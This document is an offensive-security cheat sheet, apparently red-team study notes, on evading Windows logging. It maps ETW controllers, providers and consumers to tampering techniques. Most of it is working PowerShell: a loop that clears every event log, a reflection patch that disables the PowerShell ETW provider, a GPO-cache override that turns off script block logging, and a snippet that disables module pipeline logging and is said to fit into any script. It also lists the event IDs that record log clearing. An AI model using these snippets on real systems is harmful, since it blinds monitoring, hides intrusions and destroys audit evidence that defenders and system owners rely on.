# Evading Logging

## Event Tracing for Windows
Event Tracing for Windows (ETW) is logging mechanism built into Windows that allows the operating system and applications to record detailed events for diagnostics, debugging, and performance monitoring.

| Component   | Purpose     |
|:-----------:|:-----------:|
| Controllers |	Build and configure sessions |
| Providers	  | Generate events |
| Consumers	  | Interpret events |


| Component   | Techniques |
|:-----------:|:-----------:|
| Controller  | Patching EtwEventWrite, Runtime Tracing Tampering| 
| Provider    | PSEtwLogProvider Modification, Group Policy Takeover, Log Pipeline Abuse, Type Creation |
| Consumers   | Log Smashing, Log Tampering |

### Clearing Logs
```
Clear-EventLog -LogName Application, System, Security
Get-EventLog -LogName * | ForEach-Object { Clear-EventLog -LogName $_.Log }
```

|Event ID | Purpose     |
|:-------:|:-----------:|
|1102     |  Logs when the Windows Security audit log was cleared |
|104      |  Logs when the log file was cleared |
|1100     |  Logs when the Windows Event Log service was shut down |

### Powershell Reflection Bypass

```
$logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
$etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)
[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0);
```

```
Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count
```

### GPO Bypass

```
# Disable logging for event IDs: 4103, 4104
$GroupPolicyField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static');
  If ($GroupPolicyField) {
      $GroupPolicyCache = $GroupPolicyField.GetValue($null);
      If ($GroupPolicyCache['ScriptBlockLogging']) {
          $GroupPolicyCache['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0;
          $GroupPolicyCache['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0;
      }
      $val = [System.Collections.Generic.Dictionary[string,System.Object]]::new();
      $val.Add('EnableScriptBlockLogging', 0);
      $val.Add('EnableScriptBlockInvocationLogging', 0);
      $GroupPolicyCache['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'] = $val
  };
```

### Abusing Log Pipeline

```
# TThis script can be appended to any PowerShell script or run in a session to disable module logging of currently imported modules
$module = Get-Module Microsoft.PowerShell.Utility # Get target module
$module.LogPipelineExecutionDetails = $false # Set module execution details to false
$snap = Get-PSSnapin Microsoft.PowerShell.Core # Get target ps-snapin
$snap.LogPipelineExecutionDetails = $false
```